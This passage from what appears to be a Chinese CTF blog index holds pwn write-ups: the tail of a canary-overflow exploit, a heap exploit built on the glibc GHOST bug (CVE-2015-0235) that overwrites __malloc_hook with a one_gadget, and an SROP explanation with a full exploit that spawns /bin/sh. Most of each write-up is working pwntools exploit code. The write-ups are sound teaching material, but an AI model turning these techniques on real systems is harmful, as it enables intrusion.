punctuation">)</span><span class="token keyword">if</span> <span class="token string">b'high'</span> <span class="token keyword">in</span> ret<span class="token punctuation">:</span>high <span class="token operator">=</span> mid<span class="token keyword">elif</span> <span class="token string">b'low'</span> <span class="token keyword">in</span> ret<span class="token punctuation">:</span>low <span class="token operator">=</span> mid<span class="token keyword">else</span><span class="token punctuation">:</span><span class="token builtin">sum</span> <span class="token operator">+=</span> <span class="token number">1</span><span class="token keyword">break</span>ogg <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token number">0xe6c7e</span><span class="token punctuation">,</span><span class="token number">0xe6c81</span><span class="token punctuation">,</span><span class="token number">0xe6c84</span><span class="token punctuation">]</span>payload <span class="token operator">=</span> <span class="token string">b'a'</span><span class="token operator">*</span><span class="token number">24</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>canary<span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">b'bbbbbbbb'</span> <span class="token operator">+</span> p8<span class="token punctuation">(</span><span class="token number">0x7e</span><span class="token punctuation">)</span> <span class="token operator">+</span> p8<span class="token punctuation">(</span><span class="token number">0x6c</span><span class="token punctuation">)</span> <span class="token operator">+</span> p8<span class="token punctuation">(</span>mid<span class="token operator">-</span><span class="token number">0x2</span><span class="token operator">+</span><span class="token number">0xe</span><span class="token punctuation">)</span>p<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">b"my game? "</span><span class="token punctuation">,</span> payload<span class="token punctuation">)</span>p<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">"cat flag.txt"</span><span class="token punctuation">)</span>p<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span>  <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>]]></content>
      
      
      <categories>
          
          <category> PWN </category>
          
      </categories>
      
      
        <tags>
            
            <tag> pwn </tag>
            
            <tag> python2 </tag>
            
            <tag> ctf </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>pwn-巅峰极客-GHOST</title>
      <link href="//post/pwn-%E5%B7%85%E5%B3%B0%E6%9E%81%E5%AE%A2-GHOST.html"/>
      <url>//post/pwn-%E5%B7%85%E5%B3%B0%E6%9E%81%E5%AE%A2-GHOST.html</url>
      
        <content type="html"><![CDATA[<h1 id="巅峰极客-GHOST"><a href="#巅峰极客-GHOST" class="headerlink" title="巅峰极客-GHOST"></a>巅峰极客-GHOST</h1><p>2021巅峰极客pwn</p><span id="more"></span><h2 id="0x00-分析"><a href="#0x00-分析" class="headerlink" title="0x00 分析"></a>0x00 分析</h2><pre class="line-numbers language-none"><code class="language-none">cve-2015-0235，glibc2.17<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>这个漏洞的效果就是会在Buffer里面产生溢出，<code>Buffer_size=Name_size+33</code>也是有意为之了</p><p>触发的条件就是<code>NameArr</code>的内容都为<code>&quot;0&quot;</code>（注意是字符0，不是0字节）</p><p>然后溢出的字节也是n个字符<code>&quot;0&quot;</code>，同时最后有个0字节。后面没去深究了，不太清楚有没有其他的溢出情况</p><p>不太了解2.17，索性先当成2.23来思考。本来想着当成<code>off-by-null</code>来做的，但是似乎<code>prev_size</code>不太好控制</p><p>所以就想着利用<code>small bin</code>来用这个<code>off-by-null</code>，但由于程序在<code>add</code>的时候一次性会涉及到三个及以上的<code>chunk</code>的操作，堆的布局不太好构造，便想着找个更好的办法</p><p>后来的解决办法就是溢出2个<code>&quot;0&quot;</code>，即把<code>small bin</code>的<code>size</code>覆盖成<code>0x3030</code>的大小</p><p>这样再对<code>small bin</code>进行切割之后（实际<code>size</code>已经被修改为<code>0x3030</code>），就得到了一个覆盖后面的超大<code>large bin</code>。只要提前准备好，就可以通过切割<code>large bin</code>，对下面的一大片堆空间进行随意的复用了</p><h2 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h2><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>context<span class="token punctuation">.</span>log_level<span class="token operator">=</span><span class="token string">'debug'</span>context<span class="token punctuation">.</span>arch<span class="token operator">=</span><span class="token string">'amd64'</span>elf<span class="token operator">=</span>ELF<span class="token punctuation">(</span><span class="token string">'./pwn'</span><span class="token punctuation">)</span>sh<span class="token operator">=</span>process<span class="token punctuation">(</span><span class="token string">'./pwn'</span><span class="token punctuation">)</span>libc<span class="token operator">=</span>ELF<span class="token punctuation">(</span><span class="token string">'./libc.so.6'</span><span class="token punctuation">)</span>sa <span class="token operator">=</span> <span class="token keyword">lambda</span> s<span class="token punctuation">,</span>n <span class="token punctuation">:</span> sh<span class="token punctuation">.</span>sendafter<span class="token punctuation">(</span>s<span class="token punctuation">,</span>n<span class="token punctuation">)</span>sla <span class="token operator">=</span> <span class="token keyword">lambda</span> s<span class="token punctuation">,</span>n <span class="token punctuation">:</span> sh<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span>s<span class="token punctuation">,</span>n<span class="token punctuation">)</span>sl <span class="token operator">=</span> <span class="token keyword">lambda</span> s <span class="token punctuation">:</span> sh<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>s<span class="token punctuation">)</span>sd <span class="token operator">=</span> <span class="token keyword">lambda</span> s <span class="token punctuation">:</span> sh<span class="token punctuation">.</span>send<span class="token punctuation">(</span>s<span class="token punctuation">)</span>rc <span class="token operator">=</span> <span class="token keyword">lambda</span> n <span class="token punctuation">:</span> sh<span class="token punctuation">.</span>recv<span class="token punctuation">(</span>n<span class="token punctuation">)</span>ru <span class="token operator">=</span> <span class="token keyword">lambda</span> s <span class="token punctuation">:</span> sh<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span>s<span class="token punctuation">)</span>ti <span class="token operator">=</span> <span class="token keyword">lambda</span> <span class="token punctuation">:</span> sh<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span>leak <span class="token operator">=</span> <span class="token keyword">lambda</span> name<span class="token punctuation">,</span>addr <span class="token punctuation">:</span>log<span class="token punctuation">.</span>success<span class="token punctuation">(</span>name<span class="token operator">+</span><span class="token string">":"</span><span class="token operator">+</span><span class="token builtin">hex</span><span class="token punctuation">(</span>addr<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">add</span><span class="token punctuation">(</span>idx<span class="token punctuation">,</span>size<span class="token punctuation">,</span>content<span class="token punctuation">)</span><span class="token punctuation">:</span>sla<span class="token punctuation">(</span><span class="token string">">>"</span><span class="token punctuation">,</span><span class="token builtin">str</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span>sla<span class="token punctuation">(</span><span class="token string">"idx:"</span><span class="token punctuation">,</span><span class="token builtin">str</span><span class="token punctuation">(</span>idx<span class="token punctuation">)</span><span class="token punctuation">)</span>sla<span class="token punctuation">(</span><span class="token string">"len:"</span><span class="token punctuation">,</span><span class="token builtin">str</span><span class="token punctuation">(</span>size<span class="token punctuation">)</span><span class="token punctuation">)</span>sd<span class="token punctuation">(</span>content<span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">delete</span><span class="token punctuation">(</span>idx<span class="token punctuation">)</span><span class="token punctuation">:</span>sla<span class="token punctuation">(</span><span class="token string">">>"</span><span class="token punctuation">,</span><span class="token builtin">str</span><span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">)</span><span class="token punctuation">)</span>sla<span class="token punctuation">(</span><span class="token string">"idx:"</span><span class="token punctuation">,</span><span class="token builtin">str</span><span class="token punctuation">(</span>idx<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">show</span><span class="token punctuation">(</span>idx<span class="token punctuation">)</span><span class="token punctuation">:</span>sla<span class="token punctuation">(</span><span class="token string">">>"</span><span class="token punctuation">,</span><span class="token builtin">str</span><span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">)</span>sla<span class="token punctuation">(</span><span class="token string">"idx:"</span><span class="token punctuation">,</span><span class="token builtin">str</span><span class="token punctuation">(</span>idx<span class="token punctuation">)</span><span class="token punctuation">)</span>add<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">0xf0</span><span class="token punctuation">,</span><span class="token string">'0\n'</span><span class="token punctuation">)</span>add<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">0x20</span><span class="token punctuation">,</span><span class="token string">"0\n"</span><span class="token punctuation">)</span>add<span class="token punctuation">(</span><span class="token number">14</span><span class="token punctuation">,</span><span class="token number">0x68</span><span class="token punctuation">,</span><span class="token string">"0\n"</span><span class="token punctuation">)</span>add<span class="token punctuation">(</span><span class="token number">15</span><span class="token punctuation">,</span><span class="token number">0x20</span><span class="token punctuation">,</span><span class="token string">"0\n"</span><span class="token punctuation">)</span>add<span class="token punctuation">(</span><span class="token number">13</span><span class="token punctuation">,</span><span class="token number">0x40</span><span class="token punctuation">,</span><span class="token string">"0\n"</span><span class="token punctuation">)</span>add<span class="token punctuation">(</span><span class="token number">12</span><span class="token punctuation">,</span><span class="token number">0x60</span><span class="token punctuation">,</span><span class="token string">"0\n"</span><span class="token punctuation">)</span>delete<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span>add<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">0x71</span><span class="token punctuation">,</span><span class="token string">"0\n"</span><span class="token punctuation">)</span>delete<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span>add<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">0x130</span><span class="token punctuation">,</span><span class="token string">"0\n"</span><span class="token punctuation">)</span>delete<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span>add<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">0x72</span><span class="token punctuation">,</span><span class="token string">"0"</span><span class="token operator">*</span><span class="token number">0x72</span><span class="token punctuation">)</span>delete<span class="token punctuation">(</span><span class="token number">15</span><span class="token punctuation">)</span>add<span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">0x58</span><span class="token punctuation">,</span><span class="token string">"0\n"</span><span class="token punctuation">)</span>show<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span>addr<span class="token operator">=</span>u64<span class="token punctuation">(</span>rc<span class="token punctuation">(</span><span class="token number">6</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token operator">-</span><span class="token number">6</span><span class="token punctuation">:</span><span class="token punctuation">]</span><span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">,</span><span class="token string">"\x00"</span><span class="token punctuation">)</span><span class="token punctuation">)</span>leak<span class="token punctuation">(</span><span class="token string">"addr"</span><span class="token punctuation">,</span>addr<span class="token punctuation">)</span>heap_base<span class="token operator">=</span>addr<span class="token operator">-</span><span class="token number">0x9c0</span>leak<span class="token punctuation">(</span><span class="token string">"heap_base"</span><span class="token punctuation">,</span>heap_base<span class="token punctuation">)</span>delete<span class="token punctuation">(</span><span class="token number">12</span><span class="token punctuation">)</span>payload<span class="token operator">=</span><span class="token string">"0"</span>payload<span class="token operator">=</span>payload<span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">0x20</span><span class="token punctuation">,</span><span class="token string">"\x00"</span><span class="token punctuation">)</span>payload<span class="token operator">+=</span>p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span><span class="token number">0x31</span><span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token operator">*</span><span class="token number">4</span>payload<span class="token operator">+=</span>p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span><span class="token number">0x21</span><span class="token punctuation">)</span>payload<span class="token operator">=</span>payload<span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">0xb0</span><span class="token punctuation">,</span><span class="token string">"\x00"</span><span class="token punctuation">)</span>payload<span class="token operator">+=</span>p64<span class="token punctuation">(</span>heap_base<span class="token operator">+</span><span class="token number">0x138</span><span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token operator">*</span><span class="token number">3</span><span class="token operator">+</span><span class="token string">"\n"</span>add<span class="token punctuation">(</span><span class="token number">4</span><span class="token punctuation">,</span><span class="token number">0x130</span><span class="token punctuation">,</span>payload<span class="token punctuation">)</span>show<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span>main_arena<span class="token operator">=</span>u64<span class="token punctuation">(</span>ru<span class="token punctuation">(</span><span class="token string">"\x7f"</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token operator">-</span><span class="token number">6</span><span class="token punctuation">:</span><span class="token punctuation">]</span><span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">,</span><span class="token string">"\x00"</span><span class="token punctuation">)</span><span class="token punctuation">)</span>leak<span class="token punctuation">(</span><span class="token string">"main_arena"</span><span class="token punctuation">,</span>main_arena<span class="token punctuation">)</span>libc_base<span class="token operator">=</span>main_arena<span class="token operator">-</span><span class="token number">0x3c1798</span>leak<span class="token punctuation">(</span><span class="token string">"libc_base"</span><span class="token punctuation">,</span>libc_base<span class="token punctuation">)</span>malloc_hook<span class="token operator">=</span>libc_base<span class="token operator">+</span>libc<span class="token punctuation">.</span>sym<span class="token punctuation">[</span><span class="token string">'__malloc_hook'</span><span class="token punctuation">]</span>leak<span class="token punctuation">(</span><span class="token string">"malloc_hook"</span><span class="token punctuation">,</span>malloc_hook<span class="token punctuation">)</span>one_gadget<span class="token operator">=</span><span class="token punctuation">[</span><span class="token number">0x46262</span><span class="token punctuation">,</span><span class="token number">0x462b8</span><span class="token punctuation">,</span><span class="token number">0xe66b5</span><span class="token punctuation">]</span>one<span class="token operator">=</span>libc_base<span class="token operator">+</span>one_gadget<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span>payload<span class="token operator">=</span><span class="token string">"0\x00"</span>payload<span class="token operator">=</span>payload<span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">0x30</span><span class="token punctuation">,</span><span class="token string">"\x00"</span><span class="token punctuation">)</span>payload<span class="token operator">+=</span>p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span><span class="token number">0x51</span><span class="token punctuation">)</span>payload<span class="token operator">+=</span>p64<span class="token punctuation">(</span>heap_base<span class="token operator">+</span><span class="token number">0x480</span><span class="token punctuation">)</span>payload<span class="token operator">+=</span>p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token operator">*</span><span class="token number">7</span>payload<span class="token operator">+=</span>p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span><span class="token number">0x71</span><span class="token punctuation">)</span>payload<span class="token operator">+=</span>p64<span class="token punctuation">(</span>malloc_hook<span class="token operator">-</span><span class="token number">0x23</span><span class="token punctuation">)</span>payload<span class="token operator">+=</span>p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token operator">*</span><span class="token number">11</span>payload<span class="token operator">+=</span>p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span><span class="token number">0x31</span><span class="token punctuation">)</span>payload<span class="token operator">+=</span>p64<span class="token punctuation">(</span>heap_base<span class="token operator">+</span><span class="token number">0x420</span><span class="token punctuation">)</span>payload<span class="token operator">+=</span>p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token operator">*</span><span class="token number">4</span>payload<span class="token operator">+=</span>p64<span class="token punctuation">(</span><span class="token number">0x71</span><span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span>malloc_hook<span class="token operator">-</span><span class="token number">0x23</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token string">"\n"</span>add<span class="token punctuation">(</span><span class="token number">6</span><span class="token punctuation">,</span><span class="token number">0x160</span><span class="token punctuation">,</span>payload<span class="token punctuation">)</span>add<span class="token punctuation">(</span><span class="token number">7</span><span class="token punctuation">,</span><span class="token number">0x40</span><span class="token punctuation">,</span><span class="token string">"0\n"</span><span class="token punctuation">)</span>sla<span class="token punctuation">(</span><span class="token string">">>"</span><span class="token punctuation">,</span><span class="token builtin">str</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span>sla<span class="token punctuation">(</span><span class="token string">"idx:"</span><span class="token punctuation">,</span><span class="token builtin">str</span><span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">)</span><span class="token punctuation">)</span>sla<span class="token punctuation">(</span><span class="token string">"len:"</span><span class="token punctuation">,</span><span class="token builtin">str</span><span class="token punctuation">(</span><span class="token number">0x60</span><span class="token punctuation">)</span><span class="token punctuation">)</span>payload<span class="token operator">=</span><span class="token string">'a'</span><span class="token operator">*</span><span class="token punctuation">(</span><span class="token number">0x13</span><span class="token operator">-</span><span class="token number">0x8</span><span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span>one<span class="token punctuation">)</span><span class="token operator">*</span><span class="token number">2</span>sd<span class="token punctuation">(</span>payload<span class="token operator">+</span><span class="token string">"\n"</span><span class="token punctuation">)</span>ti<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>]]></content>
      
      
      <categories>
          
          <category> PWN </category>
          
      </categories>
      
      
        <tags>
            
            <tag> pwn </tag>
            
            <tag> python2 </tag>
            
            <tag> ctf </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>pwn-SROP</title>
      <link href="//post/pwn-SROP.html"/>
      <url>//post/pwn-SROP.html</url>
      
        <content type="html"><![CDATA[<h1 id="SROP"><a href="#SROP" class="headerlink" title="SROP"></a>SROP</h1><h2 id="srop原理"><a href="#srop原理" class="headerlink" title="srop原理"></a>srop原理</h2><p>内核在 signal 信号处理的过程中，内核主要做的工作就是为进程保存上下文，并且恢复上下文。这个主要的变动都在 Signal Frame 中。但是需要注意的是：</p><ul><li>Signal Frame 被保存在用户的地址空间中，所以用户是可以读写的。</li><li>由于内核与信号处理程序无关 (kernel agnostic about signal handlers)，它并不会去记录这个 signal 对应的 Signal Frame，所以当执行 sigreturn 系统调用时，此时的 Signal Frame 并不一定是之前内核为用户进程保存的 Signal Frame。</li></ul><span id="more"></span><p>构造 ROP 攻击的时候，需要满足下面的条件</p><ul><li><strong>可以通过栈溢出来控制栈的内容</strong></li><li>需要知道相应的地址<ul><li><strong>“/bin/sh”</strong></li><li><strong>Signal Frame</strong></li><li><strong>syscall</strong></li><li><strong>sigreturn</strong></li></ul></li><li>需要有够大的空间来塞下整个 sigal frame</li></ul><h2 id="示例"><a href="#示例" class="headerlink" title="示例"></a>示例</h2><h3 id="360-春秋杯中的-smallest-pwn"><a href="#360-春秋杯中的-smallest-pwn" class="headerlink" title="360 春秋杯中的 smallest-pwn"></a>360 春秋杯中的 smallest-pwn</h3><p>该题就几行代码，如下</p><pre class="line-numbers language-assembly" data-language="assembly"><code class="language-assembly">public startstart proc nearxor     rax, rax     #自己异或即为0，  0&#x3D;&gt;rax  ，syscall的编号也是0mov     edx, 400h  #第3个参数mov     rsi, rsp   #第2个参数，$rspmov     rdi, rax   #第一个参数，$rax&#x3D;&#x3D;0syscallretnstart endp<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>根据 syscall 的编号为 0，可以知道该程序执行的指令为 read(0,$rsp,400)，即向栈顶读入 400 个字符。毫无疑问，这个是有栈溢出的。</p><h4 id="利用方式"><a href="#利用方式" class="headerlink" title="利用方式"></a>利用方式</h4><p>由于程序中并没有 sigreturn 调用，所以我们得自己构造，正好这里有 read 函数调用，所以我们可以通过 read 函数读取的字节数来设置 rax 的值。重要思路如下</p><ul><li><p>通过控制 read 读取的字符数来设置 RAX 寄存器的值，从而执行 sigreturn</p></li><li><p>通过 syscall 执行 execve(“/bin/sh”,0,0) 来获取 shell。</p></li></ul><h4 id="解题过程"><a href="#解题过程" class="headerlink" title="解题过程"></a>解题过程</h4><ul><li>读取三个程序起始地址</li><li>程序返回时，利用第一个程序起始地址读取地址，修改返回地址 (即第二个程序起始地址) 为源程序的第二条指令，并且会设置 rax=1</li><li>那么此时将会执行 write(1,$esp,0x400)，泄露栈地址。</li><li>利用第三个程序起始地址进而读入 payload</li><li>再次读取构造 sigreturn 调用，进而将向栈地址所在位置读入数据，构造 execve(‘/bin/sh’,0,0)</li><li>再次读取构造 sigreturn 调用，从而获取 shell。</li></ul><h4 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h4><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span><span class="token keyword">from</span> LibcSearcher <span class="token keyword">import</span> <span class="token operator">*</span>small <span class="token operator">=</span> ELF<span class="token punctuation">(</span><span class="token string">'./smallest'</span><span class="token punctuation">)</span><span class="token keyword">if</span> args<span class="token punctuation">[</span><span class="token string">'REMOTE'</span><span class="token punctuation">]</span><span class="token punctuation">:</span>    sh <span class="token operator">=</span> remote<span class="token punctuation">(</span><span class="token string">'127.0.0.1'</span><span class="token punctuation">,</span> <span class="token number">7777</span><span class="token punctuation">)</span><span class="token keyword">else</span><span class="token punctuation">:</span>    sh <span class="token operator">=</span> process<span class="token punctuation">(</span><span class="token string">'./smallest'</span><span class="token punctuation">)</span>context<span class="token punctuation">.</span>arch <span class="token operator">=</span> <span class="token string">'amd64'</span>context<span class="token punctuation">.</span>log_level <span class="token operator">=</span> <span class="token string">'debug'</span>syscall_ret <span class="token operator">=</span> <span class="token number">0x00000000004000BE</span>start_addr <span class="token operator">=</span> <span class="token number">0x00000000004000B0</span><span class="token comment">## set start addr three times</span>payload <span class="token operator">=</span> p64<span class="token punctuation">(</span>start_addr<span class="token punctuation">)</span> <span class="token operator">*</span> <span class="token number">3</span>sh<span class="token punctuation">.</span>send<span class="token punctuation">(</span>payload<span class="token punctuation">)</span><span class="token comment">## modify the return addr to start_addr+3</span><span class="token comment">## so that skip the xor rax,rax; then the rax=1</span><span class="token comment">## get stack addr</span>sh<span class="token punctuation">.</span>send<span class="token punctuation">(</span><span class="token string">'\xb3'</span><span class="token punctuation">)</span>stack_addr <span class="token operator">=</span> u64<span class="token punctuation">(</span>sh<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">8</span><span class="token punctuation">:</span><span class="token number">16</span><span class="token punctuation">]</span><span class="token punctuation">)</span>log<span class="token punctuation">.</span>success<span class="token punctuation">(</span><span class="token string">'leak stack addr :'</span> <span class="token operator">+</span> <span class="token builtin">hex</span><span class="token punctuation">(</span>stack_addr<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token comment">## make the rsp point to stack_addr</span><span class="token comment">## the frame is read(0,stack_addr,0x400)</span>sigframe <span class="token operator">=</span> SigreturnFrame<span class="token punctuation">(</span><span class="token punctuation">)</span>sigframe<span class="token punctuation">.</span>rax <span class="token operator">=</span> constants<span class="token punctuation">.</span>SYS_readsigframe<span class="token punctuation">.</span>rdi <span class="token operator">=</span> <span class="token number">0</span>sigframe<span class="token punctuation">.</span>rsi <span class="token operator">=</span> stack_addrsigframe<span class="token punctuation">.</span>rdx <span class="token operator">=</span> <span class="token number">0x400</span>sigframe<span class="token punctuation">.</span>rsp <span class="token operator">=</span> stack_addrsigframe<span class="token punctuation">.</span>rip <span class="token operator">=</span> syscall_retpayload <span class="token operator">=</span> p64<span class="token punctuation">(</span>start_addr<span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">'a'</span> <span class="token operator">*</span> <span class="token number">8</span> <span class="token operator">+</span> <span class="token builtin">str</span><span class="token punctuation">(</span>sigframe<span class="token punctuation">)</span>sh<span class="token punctuation">.</span>send<span class="token punctuation">(</span>payload<span class="token punctuation">)</span><span class="token comment">## set rax=15 and call sigreturn</span>sigreturn <span class="token operator">=</span> p64<span class="token punctuation">(</span>syscall_ret<span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">'b'</span> <span class="token operator">*</span> <span class="token number">7</span>sh<span class="token punctuation">.</span>send<span class="token punctuation">(</span>sigreturn<span class="token punctuation">)</span><span class="token comment">## call execv("/bin/sh",0,0)</span>sigframe <span class="token operator">=</span> SigreturnFrame<span class="token punctuation">(</span><span class="token punctuation">)</span>sigframe<span class="token punctuation">.</span>rax <span class="token operator">=</span> constants<span class="token punctuation">.</span>SYS_execvesigframe<span class="token punctuation">.</span>rdi <span class="token operator">=</span> stack_addr <span class="token operator">+</span> <span class="token number">0x120</span>  <span class="token comment"># "/bin/sh" 's addr</span>sigframe<span class="token punctuation">.</span>rsi <span class="token operator">=</span> <span class="token number">0x0</span>sigframe<span class="token punctuation">.</span>rdx <span class="token operator">=</span> <span class="token number">0x0</span>sigframe<span class="token punctuation">.</span>rsp <span class="token operator">=</span> stack_addrsigframe<span class="token punctuation">.</span>rip <span class="token operator">=</span> syscall_retframe_payload <span class="token operator">=</span> p64<span class="token punctuation">(</span>start_addr<span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">'b'</span> <span class="token operator">*</span> <span class="token number">8</span> <span class="token operator">+</span> <span class="token builtin">str</span><span class="token punctuation">(</span>sigframe<span class="token punctuation">)</span><span class="token keyword">print</span> <span class="token builtin">len</span><span class="token punctuation">(</span>frame_payload<span class="token punctuation">)</span>payload <span class="token operator">=</span> frame_payload <span class="token operator">+</span> <span class="token punctuation">(</span><span class="token number">0x120</span> <span class="token operator">-</span> <span class="token builtin">len</span><span class="token punctuation">(</span>frame_payload<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">*</span> <span class="token string">'\x00'</span> <span class="token operator">+</span> <span class="token string">'/bin/sh\x00'</span>sh<span class="token punctuation">.</span>send<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>sh<span class="token punctuation">.</span>send<span class="token punctuation">(</span>sigreturn<span class="token punctuation">)</span>sh<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>]]></content>
      
      
      <categories>
          
          <category> PWN </category>
          
      </categories>
      
      
        <tags>
            
            <tag> pwn </tag>
            
            <tag> python2 </tag>
            
            <tag> ctf </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>pwn-DASCTF July- EasyHeap</title>
      <link href="//post/pwn-DASCTF-July-EasyHeap.html"/>
      <url>//post/pwn-DASCTF-July-EasyHeap.html</url>
      
